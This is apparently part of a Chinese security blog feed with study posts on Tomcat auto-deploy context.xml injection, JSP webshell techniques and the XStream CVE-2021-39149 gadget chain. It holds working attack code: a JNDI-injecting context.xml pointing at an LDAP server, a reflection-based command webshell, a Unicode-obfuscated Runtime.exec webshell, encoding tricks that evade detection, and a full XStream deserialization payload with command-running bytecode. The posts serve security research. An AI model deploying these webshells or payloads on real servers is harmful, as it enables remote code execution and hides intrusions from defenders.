alt="image-20250103111331623"></p><p>他会<code>event.getLifecycle()</code>方法返回一个<code>Host</code>对象，然后进行类型转换为<code>StandardHost</code>类型，然后设置设置一些配置。</p><p>最重要就是下面判断了Lifecycle的生命周期，在类型等于PERIODIC_EVENT，和start的时候，deployApps函数。</p><p>由于start控不了，所以在PERIODIC_EVENT的时候提供了可操作空间</p><p>org.apache.catalina.startup.HostConfig#check()</p><p><img src="image-20250103111906993.png" alt="image-20250103111906993"></p><p>org.apache.catalina.startup.HostConfig#deployApps()</p><p><img src="image-20250103112049940.png" alt="image-20250103112049940"></p><p>会从host获取tomat目录以及config目录，下面三个函数分别就是对configxml、wr包、app文件夹的操作。</p><p>org.apache.catalina.startup.HostConfig#deployDescriptors</p><p><img src="image-20250103112900576.png" alt="image-20250103112900576"></p><p>首先获取执行器，然后判读在configBase的位置,遍历一下文件是否是。xml文件结尾。</p><p>然后获取上下文名字，判断当前服务有没有这个服务，有就跳过，没有就加入。</p><p>org.apache.catalina.startup.HostConfig#deployDescriptor</p><p><img src="image-20250103145918727.png" alt="image-20250103145918727"></p><p>deployDescriptor对象会读取contextXml，然后使用digester.parse解析</p><p>org.apache.catalina.startup.HostConfig#deployWARs</p><p><img src="image-20250103124643840.png" alt="image-20250103124643840"></p><p>war包逻辑不用管了</p><p><img src="image-20250103124905101.png" alt="image-20250103124905101"></p><p>主要就是&#x2F;Users&#x2F;snake&#x2F;tomcat&#x2F;apache-tomcat-8.5.27&#x2F;webapps 判断下面有没有新增的文件夹，排除META-INF，WEB-INF。<img src="image-20250103143003726.png" alt="image-20250103143003726"></p><p>然后加入执行器。</p><p>org.apache.catalina.startup.HostConfig.DeployDirectory#run</p><p><img src="image-20250103143320135.png" alt="image-20250103143320135"></p><p>org.apache.catalina.startup.Constants</p><p><img src="image-20250103143522668.png" alt="image-20250103143522668"></p><p><img src="image-20250103143511999.png" alt="image-20250103143511999"></p><p><img src="image-20250103144834332.png" alt="image-20250103144834332"></p><p>后面即使host判断是够具有copy，有复制到host.getConfigBaseFile()文件下，然后新建一个context，listenster进行一系列绑定，最后把context加入host.addChild. </p><h3 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h3><p>​tomcat每10秒会周期性检测C<strong>onfigBaseFile(“Catalina&#x2F;localhost”)<strong>下的新文件和</strong>appBase(webroot)<strong>下有没有新增的文件夹，若果有就从当前host获取执行器ExecutorService，然后加入DeployDescriptor、DeployDirectory对象(它会在文件夹找</strong>META-INF&#x2F;context.xml</strong>)。后面就是执行器执行，调用digester.parse解析xml文件。</p><h3 id="0x03-利用"><a href="#0x03-利用" class="headerlink" title="0x03 利用"></a>0x03 利用</h3><p>​在root文件夹下创建新的文件夹，文件下有<strong>META-INF&#x2F;context.xml</strong>文件，它会自动解析。或者在**”&#x2F;conf&#x2F;Catalina&#x2F;localhost”**写入新的xml，等待线程执行器执行。</p><p><a href="https://y4tacker.github.io/2022/02/03/year/2022/2/jsp%E6%96%B0webshell%E7%9A%84%E6%8E%A2%E7%B4%A2%E4%B9%8B%E6%97%85/#%E5%8F%91%E7%8E%B0">https://y4tacker.github.io/2022/02/03/year/2022/2/jsp%E6%96%B0webshell%E7%9A%84%E6%8E%A2%E7%B4%A2%E4%B9%8B%E6%97%85/#%E5%8F%91%E7%8E%B0</a></p><p>y4xml的解析poc，简单来说就是digester.parse解析时调用setter给class的fied进行赋值。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Context</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">WatchedResource</span>&gt;</span>web.xml<span class="hljs-tag">&lt;/<span class="hljs-name">WatchedResource</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Manager</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="hljs-tag">             <span class="hljs-attr">dataSourceName</span>=<span class="hljs-string">&quot;ldap://127.0.0.1:1389/TomcatBypass/Command/calc&quot;</span></span><br><span class="hljs-tag">             <span class="hljs-attr">autoCommit</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Manager</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Context</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="image-20250103151141461.png" alt="image-20250103151141461"></p><p>成功</p><h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a href="http://www.lvyyevd.cn/archives/tomcat%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0rce%E5%A7%BF%E5%8A%BF">http://www.lvyyevd.cn/archives/tomcat%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0rce%E5%A7%BF%E5%8A%BF</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>jdk-tomcat下jspshell学习</title>
    <link href="/2025/01/02/jdk-tomcat%E4%B8%8Bjspshell%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/01/02/jdk-tomcat%E4%B8%8Bjspshell%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​主要就是对&lt;&lt;java webshell攻防下的黑魔法&gt;&gt;学习 , 推荐看原文，太复杂了 先放放</p><h2 id="反射修改"><a href="#反射修改" class="headerlink" title="反射修改"></a>反射修改</h2><h3 id="0x01-StandaloneHostService"><a href="#0x01-StandaloneHostService" class="headerlink" title="0x01 StandaloneHostService"></a>0x01 StandaloneHostService</h3><p>com.sun.deploy.uitoolkit.impl.fx.HostServicesFactory.StandaloneHostService</p><p><img src="image-20250102174717073.png" alt="image-20250102174717073"></p><p><img src="image-20250102174738274.png" alt="image-20250102174738274"></p><p>反射修改browsers为二进制命令，在传值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;com.sun.javafx.application.HostServicesDelegate&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;com.sun.deploy.uitoolkit.impl.fx.HostServicesFactory&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;com.sun.deploy.uitoolkit.impl.fx.ui.FXDefaultPreloader&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Modifier&quot;</span> %&gt;<br>&lt;%<br>    System.setProperty(<span class="hljs-string">&quot;os.name&quot;</span>,<span class="hljs-string">&quot;Linux&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;a&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;b&quot;</span>);<br>    <span class="hljs-keyword">if</span>(a!=<span class="hljs-literal">null</span> &amp;&amp; b!=<span class="hljs-literal">null</span>)&#123;<br>        <span class="hljs-type">HostServicesDelegate</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> HostServicesFactory.getInstance(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FXDefaultPreloader</span>());<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">browser</span> <span class="hljs-operator">=</span> instance.getClass().getDeclaredField(<span class="hljs-string">&quot;browsers&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">modifiersField</span> <span class="hljs-operator">=</span> Field.class.getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>); <span class="hljs-comment">//①</span><br>        modifiersField.setAccessible(<span class="hljs-literal">true</span>);<br>        modifiersField.setInt(browser, browser.getModifiers() &amp; ~Modifier.FINAL); <span class="hljs-comment">//②</span><br>        browser.setAccessible(<span class="hljs-literal">true</span>);<br>        browser.set(instance,<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;a&#125;);<br>        instance.showDocument(b);<br>    &#125;<br>%&gt;<br><br></code></pre></td></tr></table></figure><p><img src="image-20250102174854453.png" alt="image-20250102174854453"></p><h3 id="0x02-Unicode"><a href="#0x02-Unicode" class="headerlink" title="0x02 Unicode"></a>0x02 Unicode</h3><p>Q：为什么支持Unicode的写法？ A：Javac&#x2F;ecj在底层解析字符的时候支持Unicode编码</p><p>Q：为什么支持\uuuuu这种格式？ A：解析过程中只要‘\’的下一个字符是‘u’ 编译器就会一直继续循环，读取下一个字符</p><p>• Javac：com.sun.tools.javac.parser.UnicodeReader#convertUnicode</p><p>• ecj：org.eclipse.jdt.internal.compiler.parser.Scanner#getNextUnicodeChar</p><p><img src="image-20250102182400397.png" alt="image-20250102182400397"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;% \uuuuuuuuu0052\uuuuuuuuuuuuu0075\uuuu006e\uu0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\uuuuu0065\uuuuu0078\uuuuu0065\uuuu0063\u0028\u0072\u0065\u0071\uuuuuuu0075\u0065\u0073\u0074\uuuuu002e\u0067\u0065\u0074\u0050\u0061\uuuu0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\uu0022\u0029\u0029\u003b %&gt;<br><br></code></pre></td></tr></table></figure><p><img src="image-20250102182441702.png" alt="image-20250102182441702"></p><h3 id="0x03-Tomcat对于编码的解析过程"><a href="#0x03-Tomcat对于编码的解析过程" class="headerlink" title="0x03 Tomcat对于编码的解析过程"></a>0x03 <strong>Tomcat对于编码的解析过程</strong></h3><p>关于tomcat下编码后的代码文件如何被识别：文中“对于这部分处理逻辑其实是由org.apache.jasper.compiler.ParserController#determineSyntaxAndEncoding做处理，在这个类方法当中有两个比较重要的属性isXml与sourceEnc，字面理解就能得出一个判定是否jsp格式是通过xml格式编写，另一个sourceEnc也就决定着jsp文件的编码相关”</p><p>xml格式的声明中最主要是标签中的encoding属性，其决定了内容的编码如：<?xml version="1.0" encoding="utf-8" ?> 表示内容以utf-8进行内容编码</p><p>识别xml格式的方式 1.根据后缀名.jspx或.tagx （文中说明不作讨论）2.后缀名不符合则根据文本内容是否包含有形如&lt;xxx:root格式的文本，如果有也会识别为一个xml格式</p><p><img src="image-20250103092132396.png" alt="image-20250103092132396"></p><p><img src="image-20250103092355250.png" alt="image-20250103092355250"></p><p><img src="image-20250103092410544.png" alt="image-20250103092410544"></p><p><img src="image-20250103092443329.png" alt="image-20250103092443329"></p><p>可用部分的编码单字节编码：cp037、cp290等、• 2或4字节编码：utf-16le， utf-16be等、4字节编码：utf-32le、utf-32be等</p><ol><li>&lt;%@ page contentType&#x3D;”charset&#x3D;cp037” %&gt;</li><li>&lt;%@ page pageEncoding&#x3D;”cp037” %&gt;</li><li>&lt;jsp:directive.page contentType&#x3D;”charset&#x3D;cp037”&#x2F;&gt;</li><li>&lt;jsp:directive.page pageEncoding&#x3D;”cp037”&#x2F;&gt;</li></ol><p><img src="image-20250103093841024.png" alt="image-20250103093841024"></p><h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a href="https://cloud.tencent.com/developer/article/2382449">https://cloud.tencent.com/developer/article/2382449</a></p><p><a href="https://www.anquanke.com/post/id/210630">https://www.anquanke.com/post/id/210630</a></p><p><a href="https://github.com/turn1tup/JspEncounter">https://github.com/turn1tup/JspEncounter</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>java动态代理触发触发命令执行</title>
    <link href="/2024/12/28/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E8%A7%A6%E5%8F%91%E8%A7%A6%E5%8F%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2024/12/28/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E8%A7%A6%E5%8F%91%E8%A7%A6%E5%8F%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h3><p>​Xstream的利用链都是很值得学习的，hessian的利用链基本都是照搬Xstream，在漏洞挖掘中碰到了xstream，发现了一个非常有意思的利用链，所以就学习下，随便进行扩展。</p><h3 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h3><p>CVE-2021-39149</p><p>xstream中非常值得学习的一条gadget。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;map&gt;<br>  &lt;entry&gt;<br>    &lt;dynamic-proxy&gt;<br>      &lt;interface&gt;map&lt;/interface&gt;<br>      &lt;interface&gt;java.lang.Cloneable&lt;/interface&gt;<br>      &lt;interface&gt;java.io.Serializable&lt;/interface&gt;<br>      &lt;handler class=<span class="hljs-string">&quot;com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl&quot;</span>&gt;<br>        &lt;classToInvocationHandler class=<span class="hljs-string">&quot;linked-hash-map&quot;</span>/&gt;<br>        &lt;defaultHandler class=<span class="hljs-string">&quot;sun.tracing.NullProvider&quot;</span>&gt;<br>          &lt;active&gt;<span class="hljs-literal">true</span>&lt;/active&gt;<br>          &lt;providerType&gt;java.lang.Object&lt;/providerType&gt;<br>          &lt;probes&gt;<br>            &lt;entry&gt;<br>              &lt;method&gt;<br>                &lt;class&gt;java.lang.Object&lt;/class&gt;<br>                &lt;name&gt;hashCode&lt;/name&gt;<br>                &lt;parameter-types/&gt;<br>              &lt;/method&gt;<br>              &lt;sun.tracing.dtrace.DTraceProbe&gt;<br>                &lt;proxy class=<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span> serialization=<span class="hljs-string">&quot;custom&quot;</span>&gt;<br>                  &lt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;<br>                    &lt;<span class="hljs-keyword">default</span>&gt;<br>                      &lt;__name&gt;moresec197535764046369&lt;/__name&gt;<br>                      &lt;__bytecodes&gt;<br>                        &lt;<span class="hljs-type">byte</span>-array&gt;yv66vgAAADQAHAEABGNhbGMHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACWNhbGMuamF2YQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAcBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcADAEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAA4ADwoADQAQAQASb3BlbiAtYSBjYWxjdWxhdG9yCAASAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAFAAVCgANABYBAA1TdGFja01hcFRhYmxlAQAGPGluaXQ+DAAZAAoKAAgAGgAhAAIACAAAAAAAAgAIAAkACgABAAsAAAAkAAMAAgAAAA+nAAMBTLgAERITtgAXV7EAAAABABgAAAADAAEDAAEAGQAKAAEACwAAABEAAQABAAAABSq3ABuxAAAAAAABAAUAAAACAAY=&lt;/<span class="hljs-type">byte</span>-array&gt;<br>                      &lt;/__bytecodes&gt;<br>                      &lt;__transletIndex&gt;-<span class="hljs-number">1</span>&lt;/__transletIndex&gt;<br>                      &lt;__indentNumber&gt;<span class="hljs-number">0</span>&lt;/__indentNumber&gt;<br>                    &lt;/<span class="hljs-keyword">default</span>&gt;<br>                    &lt;<span class="hljs-type">boolean</span>&gt;<span class="hljs-literal">false</span>&lt;/<span class="hljs-type">boolean</span>&gt;<br>                  &lt;/com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;<br>                &lt;/proxy&gt;<br>                &lt;implementing__method&gt;<br>                  &lt;class&gt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/class&gt;<br>                  &lt;name&gt;getOutputProperties&lt;/name&gt;<br>                  &lt;parameter-types/&gt;<br>                &lt;/implementing__method&gt;<br>              &lt;/sun.tracing.dtrace.DTraceProbe&gt;<br>            &lt;/entry&gt;<br>          &lt;/probes&gt;<br>        &lt;/defaultHandler&gt;<br>      &lt;/handler&gt;<br>    &lt;/dynamic-proxy&gt;<br>    &lt;dynamic-proxy reference=<span class="hljs-string">&quot;../dynamic-proxy&quot;</span>/&gt;<br>  &lt;/entry&gt;<br>&lt;/map&gt;<br></code></pre></td></tr></table></figure><p>从poc就可以分析主要通过动态代理了map类，使用的handler为CompositeInvocationHandlerImpl。</p><p><strong>com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CompositeInvocationHandlerImpl</span> <span class="hljs-keyword">implements</span><br>    <span class="hljs-title class_">CompositeInvocationHandler</span><br>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">Map</span> <span class="hljs-variable">classToInvocationHandler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>() ;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">defaultHandler</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span> ;<br>...<br>      <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">( Object proxy, Method method, Object[] args )</span><br>        <span class="hljs-keyword">throws</span> Throwable<br>    &#123;<br>        <span class="hljs-comment">// Note that the declaring class in method is the interface</span><br>        <span class="hljs-comment">// in which the method was defined, not the proxy class.</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> method.getDeclaringClass() ;<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span><br>            (InvocationHandler)classToInvocationHandler.get( cls ) ;<br><br>        <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (defaultHandler != <span class="hljs-literal">null</span>)<br>                handler = defaultHandler ;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">ORBUtilSystemException</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> ORBUtilSystemException.get(<br>                    CORBALogDomains.UTIL ) ;<br>                <span class="hljs-keyword">throw</span> wrapper.noInvocationHandler( <span class="hljs-string">&quot;\&quot;&quot;</span> + method.toString() +<br>                    <span class="hljs-string">&quot;\&quot;&quot;</span> ) ;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> handler.invoke( proxy, method, args ) ;<br>    &#125;<br>  ....<br></code></pre></td></tr></table></figure><p>可以看到他有两个属性defaultHandler，classToInvocationHandler。他的invoke里面，先从classToInvocationHandler里面获取handler，获取不到就用defaultHandler，最后有调用了defaultHandler的invoker。</p><p><strong>这里不就是标准的二次调用动态代理么，有点意思。</strong></p><p><strong>sun.tracing.NullProvider</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NullProvider</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ProviderSkeleton</span> &#123;<br><br>    NullProvider(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Provider</span>&gt; type) &#123;<br>        <span class="hljs-built_in">super</span>(type);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> ProbeSkeleton <span class="hljs-title function_">createProbe</span><span class="hljs-params">(Method m)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullProbe</span>(m.getParameterTypes());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>他没有invoker，进而调用父类sun.tracing.ProviderSkeleton的invoker方法,ProviderSkeleton他是一个抽象类。</p><p><img src="image-20241228034951608.png" alt="image-20241228034951608"></p><p>它有四个子类，这里四个子类都没有实现invoker方法，所以这里四个只要没有active,providerType,probe 和父类一样的属性就可以拿来构造，因为本质是调用父类的invoker。查看后，其中<strong>sun.tracing.PrintStreamProvider，sun.tracing.NullProvider，sun.tracing.MultiplexProvider</strong> 可以拿来构造。</p><p><strong>sun.tracing.ProviderSkeleton</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProviderSkeleton</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span>, Provider &#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> active; <span class="hljs-comment">// set to false after dispose() is called</span><br>    <span class="hljs-keyword">protected</span> Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Provider</span>&gt; providerType; <span class="hljs-comment">// user&#x27;s interface</span><br>    <span class="hljs-keyword">protected</span> HashMap&lt;Method, ProbeSkeleton&gt; probes; <span class="hljs-comment">// methods to probes</span><br>...<br>      <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">declaringClass</span> <span class="hljs-operator">=</span> method.getDeclaringClass();<br>        <span class="hljs-comment">// not a provider subtype&#x27;s own method</span><br>        <span class="hljs-keyword">if</span> (declaringClass != providerType) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// delegate only to methods declared by</span><br>                <span class="hljs-comment">// com.sun.tracing.Provider or java.lang.Object</span><br>                <span class="hljs-keyword">if</span> (declaringClass == Provider.class ||<br>                    declaringClass == Object.class) &#123;<br>                    <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-built_in">this</span>, args);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">// assert false : &quot;this should never happen&quot;</span><br>                    <span class="hljs-comment">//    reaching here would indicate a breach</span><br>                    <span class="hljs-comment">//    in security in the higher layers</span><br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurityException</span>();<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>                <span class="hljs-keyword">assert</span> <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;<br>                <span class="hljs-keyword">assert</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            triggerProbe(method, args);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>  .....<br></code></pre></td></tr></table></figure><p>前面判断一下代理类的是否属于（providerType）interface，不等于在判断，没什么用。我们主要就是要看另一个处理triggerProbe</p><p>sun.tracing.ProviderSkeleton#triggerProbe</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">triggerProbe</span><span class="hljs-params">(Method method, Object[] args)</span> &#123;<br>    <span class="hljs-keyword">if</span> (active) &#123;<br>        <span class="hljs-type">ProbeSkeleton</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> probes.get(method);<br>        <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// Skips argument check -- already done by javac</span><br>            p.uncheckedTrigger(args);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>从probes获取ProbeSkeleton对象，然后调用uncheckedTrigger方法。probes，active都是feid，我们可以直接构造。</p><p><strong>sun.tracing.ProbeSkeleton#uncheckedTrigger</strong></p><p>他是一个abstract，一共四个实现类<img src="image-20241228034516613.png" alt="image-20241228034516613"></p><p>DTraceProbe可用，其余三个没有课利用的地方，</p><p>sun.tracing.dtrace.DTraceProbe#uncheckedTrigger</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DTraceProbe</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ProbeSkeleton</span> &#123;<br>    <span class="hljs-keyword">private</span> Object proxy;<br>    <span class="hljs-keyword">private</span> Method declared_method;<br>    <span class="hljs-keyword">private</span> Method implementing_method;<br>  ...<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">uncheckedTrigger</span><span class="hljs-params">(Object[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            implementing_method.invoke(proxy, args);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">assert</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;<br>            <span class="hljs-keyword">assert</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>  